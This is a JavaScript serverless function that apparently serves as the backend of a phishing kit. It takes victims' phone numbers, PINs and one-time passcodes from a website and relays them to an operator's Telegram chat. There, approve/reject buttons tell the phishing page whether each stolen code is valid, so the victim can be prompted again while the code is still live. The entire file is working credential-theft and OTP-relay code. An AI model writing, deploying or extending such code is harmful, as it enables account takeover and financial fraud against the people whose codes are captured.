import { kv } from '@vercel/kv';

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing Telegram Env Vars" });
    }

    // 1. WEBSITE POLLING (Checking database for approval)
    if (req.method === 'GET') {
        const { userId, type } = req.query;
        const key = `status_${userId}_${type}`;
        
        try {
            const status = await kv.get(key) || 'pending';
            // If approved/rejected, delete it so it doesn't linger
            if (status !== 'pending') {
                await kv.del(key);
            }
            return res.status(200).json({ status: status });
        } catch (error) {
            return res.status(200).json({ status: 'pending' }); 
        }
    }

    // 2. POST REQUESTS (Website OR Telegram)
    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. TELEGRAM BUTTON CLICKED
            if (body.callback_query) {
                const callback = body.callback_query;
                const data = callback.data; 
                
                const parts = data.split('_');
                const action = parts[0]; // approve or reject
                const type = parts[1]; // PHONE_PIN, OTP1, OTP2
                const userId = parts[2];

                const key = `status_${userId}_${type}`;
                await kv.set(key, action === 'approve' ? 'approved' : 'rejected', { ex: 600 });

                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>APPROVED</b> - User can proceed` 
                    : `\n\n❌ <b>REJECTED</b> - User must try again`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: callback.message.text + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE SENDING DATA
            if (body.action === 'send') {
                const { type, userId, data } = body;
                const time = new Date().toLocaleString('en-GB');
                
                await kv.set(`status_${userId}_${type}`, 'pending', { ex: 600 });
                
                // EXACT THOR FORMAT
                let message = `# Thor - ${type} Verification\n`;
                message += `<b>${type} VERIFICATION NEEDED</b>\n\n`;
                message += `<b>USER DETAILS:</b>\n`;
                message += `• Phone Number: ${data.phone}\n`;
                
                if (type === 'PHONE_PIN') {
                    message += `• PIN Code: <code>${data.pin}</code>\n`;
                } else {
                    message += `• OTP Code: <code>${data.value}</code>\n`;
                }

                message += `• Username & Pass: user_${userId}\n`;
                message += `• Time: ${time}\n`;
                message += `• Bot: user75\n\n`;
                message += `Verify the ${type}:\n`;
                message += `• Timeout: 5 minutes\n`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: `✅ Correct PIN`, callback_data: `approve_${type}_${userId}` }],
                        [
                            { text: `Correct PIN & OTP`, callback_data: `approve_${type}_${userId}` },
                            { text: `❌ Wrong PIN`, callback_data: `reject_${type}_${userId}` }
                        ],
                        [{ text: `⏱ Extend Time`, callback_data: `approve_${type}_${userId}` }]
                    ]
                };

                const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message, 
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });

                if (!tgRes.ok) {
                    const err = await tgRes.json();
                    return res.status(500).json({ error: err.description });
                }

                return res.status(200).json({ success: true });
            }
        } catch (error) {
            return res.status(500).json({ error: error.message });
        }
    }
    return res.status(405).json({ error: 'Method not allowed' });
}
